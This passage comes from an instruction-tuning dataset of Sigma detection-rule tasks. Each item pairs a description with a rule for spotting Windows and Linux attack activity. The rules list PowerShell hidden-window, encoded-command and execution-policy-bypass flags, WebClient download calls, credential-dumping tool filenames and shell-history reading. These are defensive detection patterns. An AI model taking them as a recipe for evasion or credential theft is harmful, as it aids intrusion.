    "instruction": "Build a Sigma rule with the goal of detecting use of SysmonEnte, a tool to attack the integrity of Sysmon.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of SysmonEnte, a tool to attack the integrity of Sysmon, you should: Focus on monitoring process access within Windows systems. Specifically, watch for any process that attempts to access 'C:\\Windows\\Sysmon64.exe' with granted access rights of '0x1400'. However, it's important to exclude any access attempts that originate from common system directories such as 'C:\\Program Files' and 'C:\\Windows\\System32\\', as these are likely to be legitimate. Besides, any access from 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\' ending with '\\MsMpEng.exe' should also be disregarded to avoid false alarms linked to Microsoft Defender processes. Additionally, pay attention to call traces that contain the string 'Ente', which could indicate the malicious operation of SysmonEnte. The detection strategy involves flagging scenarios that match either the direct access attempt with specified rights to Sysmon64.exe (excluding known good sources) or the presence of indicative call traces, thereby enhancing the accuracy of detecting attacks aimed at undermining Sysmon's integrity. Note that there may be unknown false positives, and the threat level associated with this detection is considered high.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_access\n    product: windows\ndetection:\n    selection_1:\n        TargetImage: 'C:\\Windows\\Sysmon64.exe'\n        GrantedAccess: '0x1400'\n    filter_1:\n        SourceImage|startswith:\n            - 'C:\\Program Files'\n            - 'C:\\Windows\\System32\\'\n    filter_msdefender:\n        SourceImage|startswith: 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\'\n        SourceImage|endswith: '\\MsMpEng.exe'\n    selection_calltrace:\n        CallTrace: 'Ente'\n    condition: ( selection_1 and not 1 of filter_* ) or selection_calltrace\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_access\n    product: windows\ndetection:\n    selection_1:\n        TargetImage: 'C:\\Windows\\Sysmon64.exe'\n        GrantedAccess: '0x1400'\n    filter_1:\n        SourceImage|startswith:\n            - 'C:\\Program Files'\n            - 'C:\\Windows\\System32\\'\n    filter_msdefender:\n        SourceImage|startswith: 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\'\n        SourceImage|endswith: '\\MsMpEng.exe'\n    selection_calltrace:\n        CallTrace: 'Ente'\n    condition: ( selection_1 and not 1 of filter_* ) or selection_calltrace\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "use of SysmonEnte, a tool to attack the integrity of Sysmon",
      "answer": "In order to detect the use of SysmonEnte, a tool to attack the integrity of Sysmon, you should: Focus on monitoring process access within Windows systems. Specifically, watch for any process that attempts to access 'C:\\Windows\\Sysmon64.exe' with granted access rights of '0x1400'. However, it's important to exclude any access attempts that originate from common system directories such as 'C:\\Program Files' and 'C:\\Windows\\System32\\', as these are likely to be legitimate. Besides, any access from 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\' ending with '\\MsMpEng.exe' should also be disregarded to avoid false alarms linked to Microsoft Defender processes. Additionally, pay attention to call traces that contain the string 'Ente', which could indicate the malicious operation of SysmonEnte. The detection strategy involves flagging scenarios that match either the direct access attempt with specified rights to Sysmon64.exe (excluding known good sources) or the presence of indicative call traces, thereby enhancing the accuracy of detecting attacks aimed at undermining Sysmon's integrity. Note that there may be unknown false positives, and the threat level associated with this detection is considered high."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential DLL sideloading of \"chrome_frame_helper.dll\".\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential DLL sideloading of \"chrome_frame_helper.dll\", you should: Focus on monitoring the loading of images (DLL files) within Windows environments. Specifically, look out for instances where the file \"chrome_frame_helper.dll\" is loaded, but not from the expected paths of Google Chrome's installation directories either in the Program Files or Program Files (x86) folders, nor from a user path within the AppData\\local\\Google\\Chrome\\Application directory. This detection is crucial as it may indicate an attempt to exploit the Chrome application by loading a malicious DLL that masquerades as the legitimate \"chrome_frame_helper.dll\". It's important to keep an eye out for these activities without automatically assuming they are malicious due to the possibility of unknown false positives, rating the level of concern as medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded|endswith: '\\chrome_frame_helper.dll'\n    filter_main_path:\n        ImageLoaded|startswith:\n            - 'C:\\Program Files\\Google\\Chrome\\Application\\'\n            - 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\'\n    filter_optional_user_path:\n        ImageLoaded|contains: '\\AppData\\local\\Google\\Chrome\\Application\\'\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded|endswith: '\\chrome_frame_helper.dll'\n    filter_main_path:\n        ImageLoaded|startswith:\n            - 'C:\\Program Files\\Google\\Chrome\\Application\\'\n            - 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\'\n    filter_optional_user_path:\n        ImageLoaded|contains: '\\AppData\\local\\Google\\Chrome\\Application\\'\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "potential DLL sideloading of \"chrome_frame_helper.dll\"",
      "answer": "In order to detect potential DLL sideloading of \"chrome_frame_helper.dll\", you should: Focus on monitoring the loading of images (DLL files) within Windows environments. Specifically, look out for instances where the file \"chrome_frame_helper.dll\" is loaded, but not from the expected paths of Google Chrome's installation directories either in the Program Files or Program Files (x86) folders, nor from a user path within the AppData\\local\\Google\\Chrome\\Application directory. This detection is crucial as it may indicate an attempt to exploit the Chrome application by loading a malicious DLL that masquerades as the legitimate \"chrome_frame_helper.dll\". It's important to keep an eye out for these activities without automatically assuming they are malicious due to the possibility of unknown false positives, rating the level of concern as medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious PowerShell invocation with a parameter substring.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious PowerShell invocation with a parameter substring, you should: monitor process creation events on Windows systems for the execution of 'powershell.exe' or 'pwsh.exe'. Specifically, look for command lines containing substrings that indicate an attempt to run PowerShell in a hidden window, use encoded commands, or bypass the execution policy. These substrings can vary slightly in spelling or syntax (including both hyphen '-' and slash '/' variants) to try and evade detection. Examples include variations of 'windowstyle hidden', 'NoProfile', 'noninteractive', 'encodedCommand', and execution policy bypass flags such as 'bypass'. Any such activity may signify a high-level threat and warrants investigation due to its potential malicious nature.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - ' -windowstyle h '\n            - ' -windowstyl h'\n            - ' -windowsty h'\n            - ' -windowst h'\n            - ' -windows h'\n            - ' -windo h'\n            - ' -wind h'\n            - ' -win h'\n            - ' -wi h'\n            - ' -win h '\n            - ' -win hi '\n            - ' -win hid '\n            - ' -win hidd '\n            - ' -win hidde '\n            - ' -NoPr '\n            - ' -NoPro '\n            - ' -NoProf '\n            - ' -NoProfi '\n            - ' -NoProfil '\n            - ' -nonin '\n            - ' -nonint '\n            - ' -noninte '\n            - ' -noninter '\n            - ' -nonintera '\n            - ' -noninterac '\n            - ' -noninteract '\n            - ' -noninteracti '\n            - ' -noninteractiv '\n            - ' -ec '\n            - ' -encodedComman '\n            - ' -encodedComma '\n            - ' -encodedComm '\n            - ' -encodedCom '\n            - ' -encodedCo '\n            - ' -encodedC '\n            - ' -encoded '\n            - ' -encode '\n            - ' -encod '\n            - ' -enco '\n            - ' -en '\n            - ' -executionpolic '\n            - ' -executionpoli '\n            - ' -executionpol '\n            - ' -executionpo '\n            - ' -executionp '\n            - ' -execution bypass'\n            - ' -executio bypass'\n            - ' -executi bypass'\n            - ' -execut bypass'\n            - ' -execu bypass'\n            - ' -exec bypass'\n            - ' -exe bypass'\n            - ' -ex bypass'\n            - ' -ep bypass'\n            - ' /windowstyle h '\n            - ' /windowstyl h'\n            - ' /windowsty h'\n            - ' /windowst h'\n            - ' /windows h'\n            - ' /windo h'\n            - ' /wind h'\n            - ' /win h'\n            - ' /wi h'\n            - ' /win h '\n            - ' /win hi '\n            - ' /win hid '\n            - ' /win hidd '\n            - ' /win hidde '\n            - ' /NoPr '\n            - ' /NoPro '\n            - ' /NoProf '\n            - ' /NoProfi '\n            - ' /NoProfil '\n            - ' /nonin '\n            - ' /nonint '\n            - ' /noninte '\n            - ' /noninter '\n            - ' /nonintera '\n            - ' /noninterac '\n            - ' /noninteract '\n            - ' /noninteracti '\n            - ' /noninteractiv '\n            - ' /ec '\n            - ' /encodedComman '\n            - ' /encodedComma '\n            - ' /encodedComm '\n            - ' /encodedCom '\n            - ' /encodedCo '\n            - ' /encodedC '\n            - ' /encoded '\n            - ' /encode '\n            - ' /encod '\n            - ' /enco '\n            - ' /en '\n            - ' /executionpolic '\n            - ' /executionpoli '\n            - ' /executionpol '\n            - ' /executionpo '\n            - ' /executionp '\n            - ' /execution bypass'\n            - ' /executio bypass'\n            - ' /executi bypass'\n            - ' /execut bypass'\n            - ' /execu bypass'\n            - ' /exec bypass'\n            - ' /exe bypass'\n            - ' /ex bypass'\n            - ' /ep bypass'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - ' -windowstyle h '\n            - ' -windowstyl h'\n            - ' -windowsty h'\n            - ' -windowst h'\n            - ' -windows h'\n            - ' -windo h'\n            - ' -wind h'\n            - ' -win h'\n            - ' -wi h'\n            - ' -win h '\n            - ' -win hi '\n            - ' -win hid '\n            - ' -win hidd '\n            - ' -win hidde '\n            - ' -NoPr '\n            - ' -NoPro '\n            - ' -NoProf '\n            - ' -NoProfi '\n            - ' -NoProfil '\n            - ' -nonin '\n            - ' -nonint '\n            - ' -noninte '\n            - ' -noninter '\n            - ' -nonintera '\n            - ' -noninterac '\n            - ' -noninteract '\n            - ' -noninteracti '\n            - ' -noninteractiv '\n            - ' -ec '\n            - ' -encodedComman '\n            - ' -encodedComma '\n            - ' -encodedComm '\n            - ' -encodedCom '\n            - ' -encodedCo '\n            - ' -encodedC '\n            - ' -encoded '\n            - ' -encode '\n            - ' -encod '\n            - ' -enco '\n            - ' -en '\n            - ' -executionpolic '\n            - ' -executionpoli '\n            - ' -executionpol '\n            - ' -executionpo '\n            - ' -executionp '\n            - ' -execution bypass'\n            - ' -executio bypass'\n            - ' -executi bypass'\n            - ' -execut bypass'\n            - ' -execu bypass'\n            - ' -exec bypass'\n            - ' -exe bypass'\n            - ' -ex bypass'\n            - ' -ep bypass'\n            - ' /windowstyle h '\n            - ' /windowstyl h'\n            - ' /windowsty h'\n            - ' /windowst h'\n            - ' /windows h'\n            - ' /windo h'\n            - ' /wind h'\n            - ' /win h'\n            - ' /wi h'\n            - ' /win h '\n            - ' /win hi '\n            - ' /win hid '\n            - ' /win hidd '\n            - ' /win hidde '\n            - ' /NoPr '\n            - ' /NoPro '\n            - ' /NoProf '\n            - ' /NoProfi '\n            - ' /NoProfil '\n            - ' /nonin '\n            - ' /nonint '\n            - ' /noninte '\n            - ' /noninter '\n            - ' /nonintera '\n            - ' /noninterac '\n            - ' /noninteract '\n            - ' /noninteracti '\n            - ' /noninteractiv '\n            - ' /ec '\n            - ' /encodedComman '\n            - ' /encodedComma '\n            - ' /encodedComm '\n            - ' /encodedCom '\n            - ' /encodedCo '\n            - ' /encodedC '\n            - ' /encoded '\n            - ' /encode '\n            - ' /encod '\n            - ' /enco '\n            - ' /en '\n            - ' /executionpolic '\n            - ' /executionpoli '\n            - ' /executionpol '\n            - ' /executionpo '\n            - ' /executionp '\n            - ' /execution bypass'\n            - ' /executio bypass'\n            - ' /executi bypass'\n            - ' /execut bypass'\n            - ' /execu bypass'\n            - ' /exec bypass'\n            - ' /exe bypass'\n            - ' /ex bypass'\n            - ' /ep bypass'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious PowerShell invocation with a parameter substring",
      "answer": "In order to detect suspicious PowerShell invocation with a parameter substring, you should: monitor process creation events on Windows systems for the execution of 'powershell.exe' or 'pwsh.exe'. Specifically, look for command lines containing substrings that indicate an attempt to run PowerShell in a hidden window, use encoded commands, or bypass the execution policy. These substrings can vary slightly in spelling or syntax (including both hyphen '-' and slash '/' variants) to try and evade detection. Examples include variations of 'windowstyle hidden', 'NoProfile', 'noninteractive', 'encodedCommand', and execution policy bypass flags such as 'bypass'. Any such activity may signify a high-level threat and warrants investigation due to its potential malicious nature."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious PowerShell download command.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious PowerShell download commands, you should monitor Windows PowerShell modules for specific patterns of activity that indicate a potential security threat. Focus on identifying scripts that use the System.Net.WebClient class, particularly those that employ the methods .DownloadFile() or .DownloadString(). These methods are commonly utilized in scripts to download files or data from the Internet, which can be a legitimate activity but may also be associated with malicious operations, such as downloading malware or other unwanted content onto a system.\n\nTo ensure a comprehensive detection strategy, all related detection options within the Windows PowerShell module environment must be considered. Specifically, look for instances where the context information contains references to 'System.Net.WebClient', along with either '.DownloadFile(' or '.DownloadString(', as these are strong indicators of the download commands in question.\n\nIt is important to note, however, that there can be legitimate uses of these methods by PowerShell scripts, resulting in potential false positives. Such benign activities could involve scripts that download content from the Internet for valid reasons, such as software updates or retrieval of public data. Therefore, while monitoring for these indicators, it is crucial to consider the context in which these commands are used to differentiate between malicious and non-malicious intent.\n\nThis detection strategy is aligned with known MITRE ATT&CK tactics and techniques associated with the execution and command and control phases of an attack, highlighting the importance of vigilance against the misuse of PowerShell for downloading malicious content as part of broader cybersecurity threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_webclient_:\n        ContextInfo|contains: 'System.Net.WebClient'\n    selection_function:\n        ContextInfo|contains:\n            - '.DownloadFile('\n            - '.DownloadString('\n    condition: all of selection_*\nfalsepositives:\n    - PowerShell scripts that download content from the Internet\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_webclient_:\n        ContextInfo|contains: 'System.Net.WebClient'\n    selection_function:\n        ContextInfo|contains:\n            - '.DownloadFile('\n            - '.DownloadString('\n    condition: all of selection_*\nfalsepositives:\n    - PowerShell scripts that download content from the Internet\nlevel: medium\n",
      "question": "suspicious PowerShell download command",
      "answer": "In order to detect suspicious PowerShell download commands, you should monitor Windows PowerShell modules for specific patterns of activity that indicate a potential security threat. Focus on identifying scripts that use the System.Net.WebClient class, particularly those that employ the methods .DownloadFile() or .DownloadString(). These methods are commonly utilized in scripts to download files or data from the Internet, which can be a legitimate activity but may also be associated with malicious operations, such as downloading malware or other unwanted content onto a system.\n\nTo ensure a comprehensive detection strategy, all related detection options within the Windows PowerShell module environment must be considered. Specifically, look for instances where the context information contains references to 'System.Net.WebClient', along with either '.DownloadFile(' or '.DownloadString(', as these are strong indicators of the download commands in question.\n\nIt is important to note, however, that there can be legitimate uses of these methods by PowerShell scripts, resulting in potential false positives. Such benign activities could involve scripts that download content from the Internet for valid reasons, such as software updates or retrieval of public data. Therefore, while monitoring for these indicators, it is crucial to consider the context in which these commands are used to differentiate between malicious and non-malicious intent.\n\nThis detection strategy is aligned with known MITRE ATT&CK tactics and techniques associated with the execution and command and control phases of an attack, highlighting the importance of vigilance against the misuse of PowerShell for downloading malicious content as part of broader cybersecurity threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting default \"UserName\" used by the DiagTrackEoP POC.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the default \"UserName\" used by the DiagTrackEoP POC, you should monitor the security logs on Windows systems for specific activity patterns that match an attacker exploiting this point of compromise. Focus on scrutinizing events with the EventID 4624, which represents successful account logon events. Specifically, look for instances where the LogonType is set to 9, indicating a NewCredentials logon type, such as those used by runas with /netonly or by a Scheduled Task. An especially critical flag for this detection is the use of the TargetOutboundUserName set to 'thisisnotvaliduser'. This username is a distinct indicator of suspicious activity related to the DiagTrackEoP proof of concept (POC) attack. Given the nature of this detection, false positives are considered unlikely, and such events should be treated with a high level of scrutiny as they can indicate critical security breaches aligned with tactics and techniques observed in sophisticated cyber attacks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4624\n        LogonType: 9\n        TargetOutboundUserName: 'thisisnotvaliduser'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4624\n        LogonType: 9\n        TargetOutboundUserName: 'thisisnotvaliduser'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "default \"UserName\" used by the DiagTrackEoP POC",
      "answer": "In order to detect the default \"UserName\" used by the DiagTrackEoP POC, you should monitor the security logs on Windows systems for specific activity patterns that match an attacker exploiting this point of compromise. Focus on scrutinizing events with the EventID 4624, which represents successful account logon events. Specifically, look for instances where the LogonType is set to 9, indicating a NewCredentials logon type, such as those used by runas with /netonly or by a Scheduled Task. An especially critical flag for this detection is the use of the TargetOutboundUserName set to 'thisisnotvaliduser'. This username is a distinct indicator of suspicious activity related to the DiagTrackEoP proof of concept (POC) attack. Given the nature of this detection, false positives are considered unlikely, and such events should be treated with a high level of scrutiny as they can indicate critical security breaches aligned with tactics and techniques observed in sophisticated cyber attacks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Files with well-known filenames (parts of credential dump software or files produced by them) creation.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect activities related to the creation of files with well-known filenames that are indicative of the use of credential dumping software or files produced by such software, you should monitor Windows file events for the creation of files with specific names or name patterns. This includes looking for file names that contain sequences like '\\pwdump', '\\kirbi', '\\pwhashes', '\\wce_ccache', '\\wce_krbtkts', and '\\fgdump-log', or file names that end with '\\test.pwd', '\\lsremora64.dll', '\\lsremora.dll', '\\fgexec.exe', '\\wceaux.dll', '\\SAM.out', '\\SECURITY.out', '\\SYSTEM.out', '\\NTDS.out', '\\DumpExt.dll', '\\DumpSvc.exe', '\\cachedump64.exe', '\\cachedump.exe', '\\pstgdump.exe', '\\servpw.exe', '\\servpw64.exe', '\\pwdump.exe', '\\procdump64.exe', and '\\Dumpy.exe'. These indicators may point to the presence of tools commonly used for dumping credentials, such as password hashes, from the system. It is important to note that in some cases, these tools or files might be used by legitimate administrators for purposes of password recovery. However, given the high-risk implications of these activities, any detection should be treated with heightened concern and investigated appropriately to determine whether it is part of a security breach or a legitimate administrative function.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        - TargetFilename|contains:\n            - '\\pwdump'\n            - '\\kirbi'\n            - '\\pwhashes'\n            - '\\wce_ccache'\n            - '\\wce_krbtkts'\n            - '\\fgdump-log'\n        - TargetFilename|endswith:\n            - '\\test.pwd'\n            - '\\lsremora64.dll'\n            - '\\lsremora.dll'\n            - '\\fgexec.exe'\n            - '\\wceaux.dll'\n            - '\\SAM.out'\n            - '\\SECURITY.out'\n            - '\\SYSTEM.out'\n            - '\\NTDS.out'\n            - '\\DumpExt.dll'\n            - '\\DumpSvc.exe'\n            - '\\cachedump64.exe'\n            - '\\cachedump.exe'\n            - '\\pstgdump.exe'\n            - '\\servpw.exe'\n            - '\\servpw64.exe'\n            - '\\pwdump.exe'\n            - '\\procdump64.exe'\n            - '\\Dumpy.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate Administrator using tool for password recovery\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        - TargetFilename|contains:\n            - '\\pwdump'\n            - '\\kirbi'\n            - '\\pwhashes'\n            - '\\wce_ccache'\n            - '\\wce_krbtkts'\n            - '\\fgdump-log'\n        - TargetFilename|endswith:\n            - '\\test.pwd'\n            - '\\lsremora64.dll'\n            - '\\lsremora.dll'\n            - '\\fgexec.exe'\n            - '\\wceaux.dll'\n            - '\\SAM.out'\n            - '\\SECURITY.out'\n            - '\\SYSTEM.out'\n            - '\\NTDS.out'\n            - '\\DumpExt.dll'\n            - '\\DumpSvc.exe'\n            - '\\cachedump64.exe'\n            - '\\cachedump.exe'\n            - '\\pstgdump.exe'\n            - '\\servpw.exe'\n            - '\\servpw64.exe'\n            - '\\pwdump.exe'\n            - '\\procdump64.exe'\n            - '\\Dumpy.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate Administrator using tool for password recovery\nlevel: high\n",
      "question": "Files with well-known filenames (parts of credential dump software or files produced by them) creation",
      "answer": "In order to detect activities related to the creation of files with well-known filenames that are indicative of the use of credential dumping software or files produced by such software, you should monitor Windows file events for the creation of files with specific names or name patterns. This includes looking for file names that contain sequences like '\\pwdump', '\\kirbi', '\\pwhashes', '\\wce_ccache', '\\wce_krbtkts', and '\\fgdump-log', or file names that end with '\\test.pwd', '\\lsremora64.dll', '\\lsremora.dll', '\\fgexec.exe', '\\wceaux.dll', '\\SAM.out', '\\SECURITY.out', '\\SYSTEM.out', '\\NTDS.out', '\\DumpExt.dll', '\\DumpSvc.exe', '\\cachedump64.exe', '\\cachedump.exe', '\\pstgdump.exe', '\\servpw.exe', '\\servpw64.exe', '\\pwdump.exe', '\\procdump64.exe', and '\\Dumpy.exe'. These indicators may point to the presence of tools commonly used for dumping credentials, such as password hashes, from the system. It is important to note that in some cases, these tools or files might be used by legitimate administrators for purposes of password recovery. However, given the high-risk implications of these activities, any detection should be treated with heightened concern and investigated appropriately to determine whether it is part of a security breach or a legitimate administrative function."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting TropicTrooper activity, an actor who targeted high-profile organizations in the energy and food and beverage sectors in Asia.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect TropicTrooper activity, an actor who targeted high-profile organizations in the energy and food and beverage sectors in Asia, you should monitor for the creation of processes in Windows operating systems that include the command line containing the specific string 'abCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCc'. Such a unique string in the command line may indicate malicious activities associated with the TropicTrooper threat actor. This monitoring is considered of high importance due to the potential impact and the targeted nature of the TropicTrooper's operations.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'abCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCc'\n    condition: selection\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: 'abCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCc'\n    condition: selection\nlevel: high\n",
      "question": "TropicTrooper activity, an actor who targeted high-profile organizations in the energy and food and beverage sectors in Asia",
      "answer": "In order to detect TropicTrooper activity, an actor who targeted high-profile organizations in the energy and food and beverage sectors in Asia, you should monitor for the creation of processes in Windows operating systems that include the command line containing the specific string 'abCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCc'. Such a unique string in the command line may indicate malicious activities associated with the TropicTrooper threat actor. This monitoring is considered of high importance due to the potential impact and the targeted nature of the TropicTrooper's operations."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting events in which someone prints the contents of history files to the commandline or redirects it to a file for reconnaissance.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect events in which someone prints the contents of history files to the commandline or redirects it to a file for reconnaissance, you should: Monitor the creation of Linux processes for instances where command-line utilities such as 'cat', 'head', 'tail', or 'more' are used. Specifically, pay attention to when these utilities are employed to access or display the contents of shell history files like '/.bash_history', '/.zsh_history', or any files that end with '_history', '.history', or 'zhistory'. This activity can indicate an attempt to understand the victim's command-line usage, possibly for further malicious endeavours. It is crucial, however, to consider that such actions might also be a part of legitimate administration activities, which are recognized as potential false positives at a medium threat level.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith:\n            - '/cat'\n            - '/head'\n            - '/tail'\n            - '/more'\n    selection_history:\n        - CommandLine|contains:\n            - '/.bash_history'\n            - '/.zsh_history'\n        - CommandLine|endswith:\n            - '_history'\n            - '.history'\n            - 'zhistory'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate administration activities\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith:\n            - '/cat'\n            - '/head'\n            - '/tail'\n            - '/more'\n    selection_history:\n        - CommandLine|contains:\n            - '/.bash_history'\n            - '/.zsh_history'\n        - CommandLine|endswith:\n            - '_history'\n            - '.history'\n            - 'zhistory'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate administration activities\nlevel: medium\n",
      "question": "events in which someone prints the contents of history files to the commandline or redirects it to a file for reconnaissance",
      "answer": "In order to detect events in which someone prints the contents of history files to the commandline or redirects it to a file for reconnaissance, you should: Monitor the creation of Linux processes for instances where command-line utilities such as 'cat', 'head', 'tail', or 'more' are used. Specifically, pay attention to when these utilities are employed to access or display the contents of shell history files like '/.bash_history', '/.zsh_history', or any files that end with '_history', '.history', or 'zhistory'. This activity can indicate an attempt to understand the victim's command-line usage, possibly for further malicious endeavours. It is crucial, however, to consider that such actions might also be a part of legitimate administration activities, which are recognized as potential false positives at a medium threat level."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting applications being added to the \"allowed applications\" list of exploit guard in order to bypass controlled folder settings.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect applications being added to the \"allowed applications\" list of exploit guard in order to bypass controlled folder settings, you should: Focus on monitoring registry set activities within Windows environments, specifically noting when the SetValue EventType occurs. This activity should be observed in relation to the registry key path that involves 'SOFTWARE\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Controlled Folder Access\\AllowedApplications'. Moreover, increased vigilance is advised for registry modifications that include additional paths such as '\\Users\\Public\\', '\\AppData\\Local\\Temp\\', '\\Desktop\\', '\\PerfLogs\\', and '\\Windows\\Temp\\'. The detection criteria consolidate any activities that meet all the aforementioned conditions. Given the high level of specificity in these monitoring parameters, false positives are considered unlikely. This proactive surveillance approach is instrumental in identifying and mitigating attempts to circumvent exploit guard controls by unauthorized modifications to the allowed applications list, ensuring the integrity and security of controlled folder settings.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection_key:\n        EventType: SetValue\n        TargetObject|contains: 'SOFTWARE\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Controlled Folder Access\\AllowedApplications'\n    selection_paths:\n        TargetObject|contains:\n            # Add more paths you don't allow in your org\n            - '\\Users\\Public\\'\n            - '\\AppData\\Local\\Temp\\'\n            - '\\Desktop\\'\n            - '\\PerfLogs\\'\n            - '\\Windows\\Temp\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection_key:\n        EventType: SetValue\n        TargetObject|contains: 'SOFTWARE\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Controlled Folder Access\\AllowedApplications'\n    selection_paths:\n        TargetObject|contains:\n            # Add more paths you don't allow in your org\n            - '\\Users\\Public\\'\n            - '\\AppData\\Local\\Temp\\'\n            - '\\Desktop\\'\n            - '\\PerfLogs\\'\n            - '\\Windows\\Temp\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "applications being added to the \"allowed applications\" list of exploit guard in order to bypass controlled folder settings",
      "answer": "In order to detect applications being added to the \"allowed applications\" list of exploit guard in order to bypass controlled folder settings, you should: Focus on monitoring registry set activities within Windows environments, specifically noting when the SetValue EventType occurs. This activity should be observed in relation to the registry key path that involves 'SOFTWARE\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Controlled Folder Access\\AllowedApplications'. Moreover, increased vigilance is advised for registry modifications that include additional paths such as '\\Users\\Public\\', '\\AppData\\Local\\Temp\\', '\\Desktop\\', '\\PerfLogs\\', and '\\Windows\\Temp\\'. The detection criteria consolidate any activities that meet all the aforementioned conditions. Given the high level of specificity in these monitoring parameters, false positives are considered unlikely. This proactive surveillance approach is instrumental in identifying and mitigating attempts to circumvent exploit guard controls by unauthorized modifications to the allowed applications list, ensuring the integrity and security of controlled folder settings."
